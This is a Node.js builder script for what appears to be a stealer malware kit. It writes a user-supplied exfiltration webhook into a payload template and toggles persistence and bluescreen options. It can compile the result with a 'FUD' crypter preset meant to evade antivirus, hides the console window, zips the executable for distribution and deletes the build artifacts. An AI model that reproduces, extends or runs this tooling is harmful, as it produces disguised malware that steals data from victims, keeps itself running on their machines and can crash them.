const fs = require("fs");
const path = require("path");
const { execSync, spawn } = require("child_process");
const AdmZip = require("adm-zip");
const createNodewExe = require("create-nodew-exe");

module.exports = async function buildProject(config) {
  try {
    let { webhook, filename, buildType, startup, bluescreen } = config;
    filename = (filename || "app") + ".exe";

    const buildDir = path.join(__dirname, "build");
    const distDir = path.join(buildDir, "dist");
    const srcDir = path.join(__dirname, "sourcemap");
    const buildSrcDir = path.join(buildDir, "src");

    if (!fs.existsSync(buildSrcDir)) {
      fs.mkdirSync(buildSrcDir, { recursive: true });
    }

    console.log("[+] Copying source files...");
    copyFiles(srcDir, buildSrcDir);

    const indexFilePath = path.join(buildSrcDir, "index.js");
    console.log(`[%] Replacing %WEBHOOK% in ${indexFilePath}...`);
    let content = fs.readFileSync(indexFilePath, "utf8");
    content = content
      .replace(/%WEBHOOK%/g, webhook)
      .replace(/"%BLUESCREEN\?%"/g, bluescreen)
      .replace(/"%PERSIST\?%"/g, startup);
    fs.writeFileSync(indexFilePath, content, "utf8");

    const packageJsonSrc = path.join(srcDir, "package.json");
    const packageJsonDest = path.join(buildSrcDir, "package.json");
    if (fs.existsSync(packageJsonSrc)) {
      fs.copyFileSync(packageJsonSrc, packageJsonDest);
    }

    let outputFile = path.join(distDir, "app.exe");

    if (buildType === "pkg") {
      console.log("[/] Running pkg build...");
      execSync("pkg . --output ../dist/app.exe --compress=GZip", {
        stdio: "inherit",
        cwd: buildSrcDir,
        encoding: "utf8",
      });
    } else if (buildType === "pkg-fud-method") {
      const fudDir = path.join(__dirname, "cryptPreset", "pkg");
      const fudSrcDir = path.join(fudDir, "src");
      const fudPkgScript = path.join(fudDir, "pkg.js");
      const fudOutputFile = path.join(fudDir, "app.exe");

      console.log(`[+] Copying source files to ${fudSrcDir} (without obfuscation)...`);
      if (!fs.existsSync(fudSrcDir)) {
        fs.mkdirSync(fudSrcDir, { recursive: true });
      }
      copyFiles(srcDir, fudSrcDir);

      const indexFilePath = path.join(fudSrcDir, "index.js");
      console.log(`[%] Replacing %WEBHOOK% in ${indexFilePath}...`);
      let content = fs.readFileSync(indexFilePath, "utf8");
      content = content
        .replace(/%WEBHOOK%/g, webhook)
        .replace(/"%BLUESCREEN\?%"/g, bluescreen)
        .replace(/"%PERSIST\?%"/g, startup);
      fs.writeFileSync(indexFilePath, content, "utf8");

      console.log(`[+] Executing ${fudPkgScript}...`);
      await runPkgBuild(fudPkgScript, fudDir);

      console.log("[+] Waiting for app.exe to appear...");
      while (!fs.existsSync(fudOutputFile)) {
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }

      console.log("[+] app.exe found, moving and renaming...");
      outputFile = path.join(__dirname, filename);
      fs.renameSync(fudOutputFile, outputFile);
    } else if (buildType === "bun") {
      console.log("[+] Running bun build...");
      execSync("npm run bunBuild", { stdio: "inherit", cwd: buildSrcDir });
    }

    if (fs.existsSync(outputFile)) {

      const tempPath = path.join(__dirname, "app.exe");
      fs.renameSync(outputFile, tempPath);
      
      console.log(`[+] moved app.exe to ${tempPath}\n[-] Removing CMD console show up`);
      let NodeWExe =  await createNodewExeForFile(tempPath)
      console.log("[+] Renaming App.exe to final executable name...");
      const finalOutputFile = path.join(__dirname, filename);
      fs.renameSync(NodeWExe, finalOutputFile);
      
      console.log("[+] Zipping the final build...");
      const zipPath = finalOutputFile.replace(".exe", ".zip");
      await zipResult(finalOutputFile, zipPath);
      console.log(`ZIP created successfully at ${zipPath}`);

      fs.unlinkSync(tempPath);
      fs.unlinkSync(finalOutputFile);
      console.log("[-] Original EXE deleted after zipping.");
    } else {
      console.error(`[/!\\]Output file ${outputFile} does not exist, cannot rename or zip.`);
    }

    console.log("[-] Cleaning build directories...");
    deleteFolderContents(buildSrcDir);
    deleteFolderContents(distDir);
    if (buildType === "pkg-fud-method") {
      deleteFolderContents(path.join(__dirname, "cryptPreset", "pkg", "src"));
    }

    console.log("[+] ✅ Build process completed successfully!");
    return Promise.resolve();
  } catch (error) {
    console.error("[/!\\] ❌ Build failed:", error);
    return Promise.reject(error);
  }
};

function copyFiles(srcDir, destDir) {
  const files = fs.readdirSync(srcDir);
  files.forEach((file) => {
    const srcPath = path.join(srcDir, file);
    const destPath = path.join(destDir, file);

    if (fs.lstatSync(srcPath).isFile()) {
      fs.copyFileSync(srcPath, destPath);
    } else if (fs.lstatSync(srcPath).isDirectory()) {
      if (!fs.existsSync(destPath)) {
        fs.mkdirSync(destPath, { recursive: true });
      }
      copyFiles(srcPath, destPath);
    }
  });
}

async function zipResult(filePath, saveZipPath) {
  const archive = new AdmZip();
  archive.addLocalFile(filePath);
  archive.writeZip(saveZipPath);
  return saveZipPath;
}

function deleteFolderContents(folderPath) {
  if (fs.existsSync(folderPath)) {
    fs.readdirSync(folderPath).forEach((file) => {
      const filePath = path.join(folderPath, file);
      if (fs.lstatSync(filePath).isDirectory()) {
        fs.rmSync(filePath, { recursive: true, force: true });
      } else {
        fs.unlinkSync(filePath);
      }
    });
    console.log(`[-] ✅ Deleted contents of ${folderPath}`);
  }
}

async function runPkgBuild(fudPkgScript, fudDir) {
  return new Promise((resolve, reject) => {
    console.log(`[+] Executing ${fudPkgScript} in its own process...`);

    const child = spawn("node", [fudPkgScript], { cwd: fudDir, stdio: "inherit" });

    const timeout = setTimeout(() => {
      child.kill();
      reject(new Error("Timeout: pkg.js took too long to execute."));
    }, 300000);

    child.on("close", (code) => {
      clearTimeout(timeout);
      if (code === 0) {
        resolve();
      } else {
        reject(new Error(`pkg.js exited with code ${code}`));
      }
    });

    child.on("error", (err) => {
      clearTimeout(timeout);
      reject(err);
    });
  });
}


async function createNodewExeForFile(filePath) {
  try {
    const newFilePath = filePath.replace(/\.exe$/, '_nodew.exe');
    console.log('[+] Renaming and creating nodew EXE...');
    createNodewExe({
      src: filePath,
      dst: newFilePath,
    });
    console.log('[+] Nodew EXE created successfully at ' + newFilePath);
    return newFilePath;
  } catch (error) {
    console.error('[/!\\] Error creating nodew EXE:', error);
    throw error;
  }
}
